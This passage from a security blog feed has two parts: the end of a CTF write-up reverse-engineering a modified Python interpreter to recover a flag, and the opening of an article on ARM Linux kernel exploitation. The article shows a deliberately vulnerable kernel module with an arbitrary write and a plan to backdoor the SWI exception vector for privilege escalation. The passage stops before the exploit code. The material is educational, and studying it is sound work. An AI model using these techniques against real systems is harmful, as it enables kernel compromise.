<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>gdb$ disass run_me
</span><span class='line'>Dump of assembler code for function run_me:
</span><span class='line'>[...]
</span><span class='line'>   ; Parses the arguments we gave, it expects a string object
</span><span class='line'>   0x0000000000513da0 &lt;+16&gt;:    lea    rcx,[rsp+0x10]
</span><span class='line'>   0x0000000000513da5 &lt;+21&gt;:    mov    rdx,rsp
</span><span class='line'>   0x0000000000513da8 &lt;+24&gt;:    call   0x4cf430 &lt;PyArg_ParseTuple&gt;
</span><span class='line'>   0x0000000000513dad &lt;+29&gt;:    xor    edx,edx
</span><span class='line'>   0x0000000000513daf &lt;+31&gt;:    test   eax,eax
</span><span class='line'>   0x0000000000513db1 &lt;+33&gt;:    je     0x513e5e &lt;run_me+206&gt;
</span><span class='line'>
</span><span class='line'>   0x0000000000513db7 &lt;+39&gt;:    mov    rax,QWORD PTR [rip+0x2d4342]
</span><span class='line'>   0x0000000000513dbe &lt;+46&gt;:    mov    esi,0x91
</span><span class='line'>   0x0000000000513dc3 &lt;+51&gt;:    mov    edi,0x56c940
</span><span class='line'>   0x0000000000513dc8 &lt;+56&gt;:    mov    rax,QWORD PTR [rax+0x10]
</span><span class='line'>   0x0000000000513dcc &lt;+60&gt;:    mov    rbx,QWORD PTR [rax+0x30]
</span><span class='line'>
</span><span class='line'>[...]
</span><span class='line'>   ; Part1
</span><span class='line'>[...]
</span><span class='line'>
</span><span class='line'>   0x0000000000513df7 &lt;+103&gt;:   mov    rsi,QWORD PTR [rsp+0x10]
</span><span class='line'>   0x0000000000513dfc &lt;+108&gt;:   mov    rdi,QWORD PTR [rsp]
</span><span class='line'>   ; Uses the string passed as argument to run_me as a marshaled object
</span><span class='line'>   ; PyObject* PyMarshal_ReadObjectFromString(char *string, Py_ssize_t len)
</span><span class='line'>   0x0000000000513e00 &lt;+112&gt;:   call   0x4dc020 &lt;PyMarshal_ReadObjectFromString&gt;
</span><span class='line'>
</span><span class='line'>   0x0000000000513e05 &lt;+117&gt;:   mov    rsi,rbx
</span><span class='line'>   0x0000000000513e08 &lt;+120&gt;:   mov    rdi,rax
</span><span class='line'>
</span><span class='line'>   ; Creates a function out of it
</span><span class='line'>   0x0000000000513e0b &lt;+123&gt;:   call   0x52c630 &lt;PyFunction_New&gt;
</span><span class='line'>   0x0000000000513e10 &lt;+128&gt;:   xor    edi,edi
</span><span class='line'>   0x0000000000513e12 &lt;+130&gt;:   mov    rbp,rax
</span><span class='line'>   0x0000000000513e15 &lt;+133&gt;:   call   0x478f80 &lt;PyTuple_New&gt;
</span><span class='line'>
</span><span class='line'>   ; Calls it
</span><span class='line'>   ; PyObject* PyObject_Call(PyObject *callable_object, PyObject *args, PyObject *kw)
</span><span class='line'>   0x0000000000513e1a &lt;+138&gt;:   xor    edx,edx
</span><span class='line'>   0x0000000000513e1c &lt;+140&gt;:   mov    rdi,rbp
</span><span class='line'>   0x0000000000513e1f &lt;+143&gt;:   mov    rsi,rax
</span><span class='line'>   0x0000000000513e22 &lt;+146&gt;:   call   0x422b40 &lt;PyObject_Call&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Basically, the string you pass to <em>run_me</em> is treated as a marshaled function: it explains why you get <em>segmentation faults</em> when you call the function with random strings.
We can just <em>jump over</em> that part of the function because we don&rsquo;t really need it so far: <em>set $eip=0x513e27</em> and job done!</p>

<h3>Second &amp; last marshaled function</h3>

<p>By the way I hope you are still reading &mdash; hold tight, we are nearly done!
Let&rsquo;s dump the function object with <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/dpy.py">dpy</a>:</p>

<figure class='code'><figcaption><span>Second part inspection with dpy</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>-----------------------------------------------------------------------------------------------------------------------[regs]
</span><span class='line'>  RAX: 0x00007FFFF7FA7050  RBX: 0x00007FFFF7F0F758  RBP: 0x00000000007B0270  RSP: 0x00007FFFFFFFE040  o d I t s Z a P c
</span><span class='line'>  RDI: 0x00007FFFF7F0F758  RSI: 0x00007FFFF7FA7050  RDX: 0x0000000000000000  RCX: 0x0000000000000828  RIP: 0x0000000000513E56
</span><span class='line'>  R8 : 0x0000000000880728  R9 : 0x00007FFFF7F8D908  R10: 0x00007FFFF7FA7050  R11: 0x00007FFFF7FA7050  R12: 0x00007FFFF7FD0F48
</span><span class='line'>  R13: 0x00000000007EF0A0  R14: 0x00007FFFF7F3CB00  R15: 0x00007FFFF7F07ED0
</span><span class='line'>  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
</span><span class='line'>-----------------------------------------------------------------------------------------------------------------------[code]
</span><span class='line'>=&gt; 0x513e56 &lt;run_me+198&gt;:       call   0x422b40 &lt;PyObject_Call&gt;
</span><span class='line'>-----------------------------------------------------------------------------------------------------------------------------
</span><span class='line'>gdb$ dpy $rdi
</span><span class='line'>function -&gt; {&#39;func_code&#39;: {&#39;co_code&#39;: &#39;\\x7c\\x00\\x00\\x64\\x01\\x00\\x6b\\x03\\x00\\x72\\x19\\x00\\x7c\\x00\\x00\\x64\\x02\\x00\\x55\\x61\\x00\\x00\\x6e\\x6e\\x00\\x7c\\x01\\x00\\x6a\\x02\\x00\\x64\\x03\\x00\\x6a\\x03\\x00\\x64\\x04\\x00\\x77\\x00\\x00\\xa0\\x05\\x00\\xc8\\x06\\x00\\xa0\\x07\\x00\\xb2\\x08\\x00\\xa0\\x09\\x00\\xea\\x0a\\x00\\xa0\\x0b\\x00\\x91\\x08\\x00\\xa0\\x0c\\x00\\x9e\\x0b\\x00\\xa0\\x0d\\x00\\xd4\\x08\\x00\\xa0\\x0e\\x00\\xd5\\x0f\\x00\\xa0\\x10\\x00\\xdd\\x11\\x00\\xa0\\x07\\x00\\xcc\\x08\\x00\\xa0\\x12\\x00\\x78\\x0b\\x00\\xa0\\x13\\x00\\x87\\x0f\\x00\\xa0\\x14\\x00\\x5b\\x15\\x00\\xa0\\x16\\x00\\x97\\x17\\x00\\x67\\x1a\\x00\\x53\\x86\\x01\\x00\\x86\\x01\\x00\\x86\\x01\\x00\\x54\\x64\\x00\\x00\\x1b&#39;,
</span><span class='line'>   &#39;co_consts&#39;: (None,
</span><span class='line'>     3,
</span><span class='line'>     1,
</span><span class='line'>     &#39;&#39;,
</span><span class='line'>     {&#39;co_code&#39;: &#39;\\x8f\\x00\\x00\\x5d\\x15\\x00\\x87\\x01\\x00\\x7c\\x00\\x00\\x8f\\x01\\x00\\x64\\x00\\x00\\x4e\\x86\\x01\\x00\\x59\\x54\\x71\\x03\\x00\\x64\\x01\\x00\\x1b&#39;,
</span><span class='line'>      &#39;co_consts&#39;: (13, None),
</span><span class='line'>      &#39;co_name&#39;: &#39;&lt;genexpr&gt;&#39;,
</span><span class='line'>      &#39;co_names&#39;: (&#39;chr&#39;,),
</span><span class='line'>      &#39;co_varnames&#39;: (&#39;.0&#39;, &#39;_&#39;)},
</span><span class='line'>     75,
</span><span class='line'>     98,
</span><span class='line'>     127,
</span><span class='line'>     45,
</span><span class='line'>     89,
</span><span class='line'>     101,
</span><span class='line'>     104,
</span><span class='line'>     67,
</span><span class='line'>     122,
</span><span class='line'>     65,
</span><span class='line'>     120,
</span><span class='line'>     99,
</span><span class='line'>     108,
</span><span class='line'>     95,
</span><span class='line'>     125,
</span><span class='line'>     111,
</span><span class='line'>     97,
</span><span class='line'>     100,
</span><span class='line'>     110),
</span><span class='line'>   &#39;co_name&#39;: &#39;foo&#39;,
</span><span class='line'>   &#39;co_names&#39;: (&#39;True&#39;, &#39;quarkslab&#39;, &#39;append&#39;, &#39;join&#39;),
</span><span class='line'>   &#39;co_varnames&#39;: ()},
</span><span class='line'> &#39;func_dict&#39;: None,
</span><span class='line'> &#39;func_doc&#39;: None,
</span><span class='line'> &#39;func_module&#39;: &#39;__main__&#39;,
</span><span class='line'> &#39;func_name&#39;: &#39;foo&#39;}
</span></code></pre></td></tr></table></div></figure>


<p>Even before studying / disassembling the code, we see some interesting things: <em>chr</em>, <em>quarkslab</em>, <em>append</em>, <em>join</em>, etc. It definitely feels like that function is generating the flag we are looking for.</p>

<p>Seeing <em>append</em>, <em>join</em> and another code object (in <em>co_consts</em>) suggests that a <em>generator</em> is used to populate the variable <em>quarkslab</em>. We also can guess that the bunch of bytes we are seeing may be the flag encoded/encrypted &mdash; anyway we can infer <strong>too much information to me</strong> just by dumping/looking at the object.</p>

<p>Let&rsquo;s use our magic <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/disassembler_ql_chall.py">disassembler.py</a> to see those codes objects:</p>

<figure class='code'><figcaption><span>part2 & its generator disassembled</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'> 19     &gt;&gt;    0 LOAD_GLOBAL              0 (True)
</span><span class='line'>              3 LOAD_CONST               1 (3)
</span><span class='line'>              6 COMPARE_OP               3 (!=)
</span><span class='line'>              9 POP_JUMP_IF_FALSE       25
</span><span class='line'>
</span><span class='line'> 20          12 LOAD_GLOBAL              0 (True)
</span><span class='line'>             15 LOAD_CONST               2 (1)
</span><span class='line'>             18 INPLACE_SUBTRACT
</span><span class='line'>             19 STORE_GLOBAL             0 (True)
</span><span class='line'>             22 JUMP_FORWARD           110 (to 135)
</span><span class='line'>
</span><span class='line'> 22     &gt;&gt;   25 LOAD_GLOBAL              1 (quarkslab)
</span><span class='line'>             28 LOAD_ATTR                2 (append)
</span><span class='line'>             31 LOAD_CONST               3 (&#39;&#39;)
</span><span class='line'>             34 LOAD_ATTR                3 (join)
</span><span class='line'>             37 LOAD_CONST               4 (&lt;code object &lt;genexpr&gt; at 023A84A0, file &quot;obfuscate/gen.py&quot;, line 22&gt;)
</span><span class='line'>             40 MAKE_FUNCTION            0
</span><span class='line'>             43 LOAD_CONST2              5 (75)
</span><span class='line'>             46 LOAD_CONST3              6 (98)
</span><span class='line'>             49 LOAD_CONST2              7 (127)
</span><span class='line'>             52 LOAD_CONST5              8 (45)
</span><span class='line'>             55 LOAD_CONST2              9 (89)
</span><span class='line'>             58 LOAD_CONST4             10 (101)
</span><span class='line'>             61 LOAD_CONST2             11 (104)
</span><span class='line'>             64 LOAD_CONST6              8 (45)
</span><span class='line'>             67 LOAD_CONST2             12 (67)
</span><span class='line'>             70 LOAD_CONST7             11 (104)
</span><span class='line'>             73 LOAD_CONST2             13 (122)
</span><span class='line'>             76 LOAD_CONST8              8 (45)
</span><span class='line'>             79 LOAD_CONST2             14 (65)
</span><span class='line'>             82 LOAD_CONST10            15 (120)
</span><span class='line'>             85 LOAD_CONST2             16 (99)
</span><span class='line'>             88 LOAD_CONST9             17 (108)
</span><span class='line'>             91 LOAD_CONST2              7 (127)
</span><span class='line'>             94 LOAD_CONST11             8 (45)
</span><span class='line'>             97 LOAD_CONST2             18 (95)
</span><span class='line'>            100 LOAD_CONST12            11 (104)
</span><span class='line'>            103 LOAD_CONST2             19 (125)
</span><span class='line'>            106 LOAD_CONST16            15 (120)
</span><span class='line'>            109 LOAD_CONST2             20 (111)
</span><span class='line'>            112 LOAD_CONST14            21 (97)
</span><span class='line'>            115 LOAD_CONST2             22 (100)
</span><span class='line'>            118 LOAD_CONST15            23 (110)
</span><span class='line'>            121 BUILD_LIST              26
</span><span class='line'>            124 GET_ITER
</span><span class='line'>            125 CALL_FUNCTION            1
</span><span class='line'>            128 CALL_FUNCTION            1
</span><span class='line'>            131 CALL_FUNCTION            1
</span><span class='line'>            134 POP_TOP
</span><span class='line'>        &gt;&gt;  135 LOAD_CONST               0 (None)
</span><span class='line'>            138 RETURN_VALUE
</span><span class='line'>================================================================================
</span><span class='line'> 22           0 LOAD_FAST                0 (.0)
</span><span class='line'>        &gt;&gt;    3 FOR_ITER                21 (to 27)
</span><span class='line'>              6 LOAD_CONST16             1 (None)
</span><span class='line'>              9 LOAD_GLOBAL              0 (chr)
</span><span class='line'>             12 LOAD_FAST                1 (_)
</span><span class='line'>             15 LOAD_CONST               0 (13)
</span><span class='line'>             18 BINARY_XOR
</span><span class='line'>             19 CALL_FUNCTION            1
</span><span class='line'>             22 YIELD_VALUE
</span><span class='line'>             23 POP_TOP
</span><span class='line'>             24 JUMP_ABSOLUTE            3
</span><span class='line'>        &gt;&gt;   27 LOAD_CONST               1 (None)
</span><span class='line'>             30 RETURN_VALUE
</span></code></pre></td></tr></table></div></figure>


<p>Great, that definitely sounds like what we described earlier.</p>

<h3>I need a decompiler dad</h3>

<p>Now because we really like to hack things, I decided to patch a Python decompiler to support the opcodes defined in this challenge in order to fully decompile the codes we saw so far.</p>

<p>I won&rsquo;t bother you with how I managed to do it though ; long story short: it is built it on top of <a href="https://github.com/gdelugre/fupy">fupy.py</a> which is a readable hackable Python 2.7 decompiler written by the awesome <a href="https://github.com/gdelugre">Guillaume Delugre</a> &mdash; Cheers to my mate <a href="https://twitter.com/Myst3rie">@Myst3rie</a> for telling about this project!</p>

<p>So here is <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/decompiler_ql_chall.py">decompiler.py</a> working on the two code objects of the challenge:</p>

<figure class='code'><figcaption><span>decompiiiiiilation</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>PS D:\Codes\ql-chall-python-2014&gt; python .\decompiler_ql_chall.py
</span><span class='line'>PART1 ====================
</span><span class='line'>Robert_Forsyth = 1
</span><span class='line'>True = True + 1
</span><span class='line'>
</span><span class='line'>PART2 ====================
</span><span class='line'>if True != 3:
</span><span class='line'>    True = True - 1
</span><span class='line'>else:
</span><span class='line'>    quarkslab.append(&#39;&#39;.join(chr(_ ^ 13) for _ in [75, 98, 127, 45, 89, 101, 104, 45, 67, 104, 122, 45, 65, 120, 99, 108, 127, 45, 95, 104, 125, 120, 111, 97, 100, 110]))
</span></code></pre></td></tr></table></div></figure>


<p>Brilliant &mdash; time to get a flag now :&ndash;).
Here are the things we need to do:</p>

<ol>
<li>Set <em>True</em> to 2 (so that it&rsquo;s equal to 3 in the part 2)</li>
<li>Declare a <em>list</em> named <em>quarkslab</em></li>
<li>Jump over the middle part of the function where it will run the bytecode you gave as argument (or give a valid marshaled string that won&rsquo;t crash the interpreter)</li>
<li>Profit!</li>
</ol>


<figure class='code'><figcaption><span>win</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>overclok@wildout:~/chall/ql-py$ /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>Python 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
</span><span class='line'>[GCC 4.8.2] on linux2
</span><span class='line'>Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
</span><span class='line'>&gt;&gt;&gt; True = 2
</span><span class='line'>&gt;&gt;&gt; quarkslab = list()
</span><span class='line'>&gt;&gt;&gt; import do_not_run_me as v
</span><span class='line'>&gt;&gt;&gt; v.run_me(&quot;c\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00C\x00\x00\x00s\x04\x00\x00\x00d\x00\x00\x1B(\x01\x00\x00\x00N(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x07\x00\x00\x00rstdinrt\x01\x00\x00\x00a\x01\x00\x00\x00s\x02\x00\x00\x00\x00\x01&quot;)
</span><span class='line'>&gt;&gt;&gt; quarkslab
</span><span class='line'>[&#39;For The New Lunar Republic&#39;]
</span></code></pre></td></tr></table></div></figure>


<h1>Conclusion</h1>

<p>This was definitely entertaining, so thanks to Serge and <a href="http://blog.quarkslab.com/">Quarkslab</a> for putting this challenge together! I feel like it would have been cooler to force people to write a disassembler or/and a decompiler to study the code of <em>run_me</em> though ; because as I mentioned at the very beginning of the article you don&rsquo;t really need any tool to guess/know roughly where the flag is, and how to get it. I still did write all those little scripts because it was fun and cool that&rsquo;s all!</p>

<p>Anyway, the codes I talked about are available on my github as usual if you want to have a look at them. You can also have look at <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/wildfire.py">wildfire.py</a> if you like weird/wild/whatever Python beasts!</p>

<p>That&rsquo;s all for today guys, I hope it wasn&rsquo;t too long and that you did enjoy the read.</p>

<p>By the way, we still think it would be cool to have more people posting on that blog, so if you are interested feel free to <a href="https://doar-e.github.io/about/">contact us</a>!</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Corrupting the ARM Exception Vector Table]]></title>
    <link href="http://doar-e.github.io/blog/2014/04/30/corrupting-arm-evt/"/>
    
    <updated>2014-04-30T21:01:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2014/04/30/corrupting-arm-evt</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>A few months ago, I was writing a Linux kernel exploitation challenge on ARM in an attempt to learn about kernel exploitation and I thought I&rsquo;d explore things a little. I chose the ARM architecture mainly because I thought it would be fun to look at. This article is going to describe how the ARM Exception Vector Table (EVT) can aid in kernel exploitation in case an attacker has a write what-where primitive. It will be covering a local exploit scenario as well as a remote exploit scenario. Please note that corrupting the EVT has been mentioned in the paper &ldquo;Vector Rewrite Attack&rdquo;<a href="http://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf">[1]</a>, which briefly talks about how it can be used in NULL pointer dereference vulnerabilities on an ARM RTOS.</p>

<p>The article is broken down into two main sections. First a brief description of the ARM EVT and its implications from an exploitation point of view (please note that a number of things about the EVT will be omitted to keep this article relatively short). We will go over two examples showing how we can abuse the EVT.</p>

<p>I am assuming the reader is familiar with Linux kernel exploitation and knows some ARM assembly (seriously).</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>ARM Exceptions and the Exception Vector Table</h1>

<p>In a few words, the EVT is to ARM what the IDT is to x86. In the ARM world, an exception is an event that causes the CPU to stop or pause from executing the current set of instructions. When this exception occurs, the CPU diverts execution to another location called an exception handler. There are 7 exception types and each exception type is associated with a mode of operation. Modes of operation affect the processor&rsquo;s &ldquo;permissions&rdquo; in regards to system resources. There are in total 7 modes of operation. The following table maps some exception types to their associated modes of operation:</p>

<pre><code> Exception                   |       Mode            |     Description
 ----------------------------|-----------------------|-------------------------------------------------------------------
 Fast Interrupt Request      |      FIQ              |   interrupts requiring fast response and low latency.
 Interrupt Request           |      IRQ              |   used for general-purpose interrupt handling.
 Software Interrupt or RESET |      Supervisor Mode  |   protected mode for the operating system.
 Prefetch or Data Abort      |      Abort Mode       |   when fetching data or an instruction from invalid/unmmaped memory.
 Undefined Instruction       |      Undefined Mode   |   when an undefined instruction is executed.
</code></pre>

<p>The other two modes are User Mode which is self explanatory and System Mode which is a privileged user mode for the operating system</p>

<h2>The Exceptions</h2>

<p>The exceptions change the processor mode and each exception has access to a set of <em>banked</em> registers. These can be described as a set of registers that exist only in the exception&rsquo;s context so modifying them will not affect the banked registers of another exception mode. Different exception modes have different banked registers:<br/>
<img src="http://doar-e.github.io/images/corrupting_arm_evt/banked_regs.png" alt="Banked Registers" /></p>

<h2>The Exception Vector Table</h2>

<p>The vector table is a table that actually contains control transfer instructions that jump to the respective exception handlers. For example, when a software interrupt is raised, execution is transfered to the software interrupt entry in the table which in turn will jump to the syscall handler. Why is the EVT so interesting to target? Well because it is loaded at a known address in memory and it is writeable* and executable. On 32-bit ARM Linux this address is <strong>0xffff0000</strong>. Each entry in the EVT is also at a known offset as can be seen on the following table:</p>

<pre><code> Exception                   |       Address            
 ----------------------------|-----------------------
 Reset                       |      0xffff0000           
 Undefined Instruction       |      0xffff0004       
 SWI                         |      0xffff0008  
 Prefetch Abort              |      0xffff000c       
 Data Abort                  |      0xffff0010 
 Reserved                    |      0xffff0014  
 IRQ                         |      0xffff0018   
 FIQ                         |      0xffff001c  
</code></pre>

<h3>A note about the Undefined Instruction exception</h3>

<p>Overwriting the Undefiend Instruction vector seems like a great plan but it actually isn&rsquo;t because it is used by the kernel. <em>Hard float</em> and <em>Soft float</em> are two solutions that allow emulation of floating point instructions since a lot of ARM platforms do not have hardware floating point units. With soft float, the emulation code is added to the userspace application at compile time. With hard float, the kernel lets the userspace application use the floating point instructions as if the CPU supported them and then using the Undefined Instruction exception, it emulates the instruction inside the kernel.</p>

<p>If you want to read more on the EVT, checkout the references at the bottom of this article, or google it.</p>

<h1>Corrupting the EVT</h1>

<p>There are few vectors we could use in order to obtain privileged code execution. Clearly, overwriting any vector in the table could potentially lead to code execution, but as the lazy people that we are, let&rsquo;s try to do the least amount of work. The easiest one to overwrite seems to be the Software Interrupt vector. It is executing in process context, system calls go through there, all is well. Let&rsquo;s now go through some PoCs/examples. All the following examples have been tested on Debian 7 ARMel 3.2.0-4-versatile running in qemu.</p>

<h2>Local scenario</h2>

<p>The example vulnerable module implements a char device that has a pretty blatant arbitrary-write vulnerability( or is it a feature?):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">/</span> <span class="n">called</span> <span class="n">when</span> <span class="err">&#39;</span><span class="n">write</span><span class="err">&#39;</span> <span class="n">system</span> <span class="n">call</span> <span class="n">is</span> <span class="n">done</span> <span class="n">on</span> <span class="n">the</span> <span class="n">device</span> <span class="n">file</span>
</span><span class='line'><span class="k">static</span> <span class="kt">ssize_t</span> <span class="n">on_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span><span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">size_t</span> <span class="n">siz</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">void</span> <span class="o">*</span> <span class="n">where</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span> <span class="n">what</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">siz</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">))</span>
</span><span class='line'>        <span class="n">what</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">where</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">));</span>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'><span class="nl">end:</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">siz</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Basically, with this cool and realistic vulnerability, you give the module an address followed by data to write at that address.
Now, our plan is going to be to backdoor the kernel by overwriting the SWI exception vector with code that jumps to our backdoor code. This code will check for a magic value in a register (say r7 which holds the syscall number) and if it matches, it will elevate the privileges of the calling process. Where do we store this backdoor code ? Considering the fact that we have an arbitrary write to kernel memory, we can either store it in userspace or somewhere in kernel space. The good thing about the latter choice is that if we choose an appropriate location in kernel space, our code will exist as long as the machine is running, whereas with the former choice, as soon as our user space application exits, the code is lost and if the entry in the EVT isn&rsquo;t set back to its original value, it will most likely be pointing to invalid/unmmapped memory which will crash the system. So we need a location in kernel space that is executable and writeable. Where could this be ? Let&rsquo;s take a closer look at the EVT:<br/>
<img src="http://doar-e.github.io/images/corrupting_arm_evt/evt_8i.png" alt="EVT Disassembly" /><br/>
As expected we see a bunch of control transfer instructions but one thing we notice about them is that &ldquo;closest&rdquo; referenced address is <em>0xffff0200</em>. Let&rsquo;s take a look what is between the end of the EVT and 0xffff0200:<br/>
<img src="http://doar-e.github.io/images/corrupting_arm_evt/evt_400wx.png" alt="EVT Inspection" /><br/>
It looks like nothing is there so we have around 480 bytes to store our backdoor which is more than enough.</p>

<h3>The Exploit</h3>

<p>Recapitulating our exploit:</p>

<pre><code>1. Store our backdoor at *0xffff0020*.  
2. Overwrite the SWI exception vector with a branch to *0xffff0020*.  
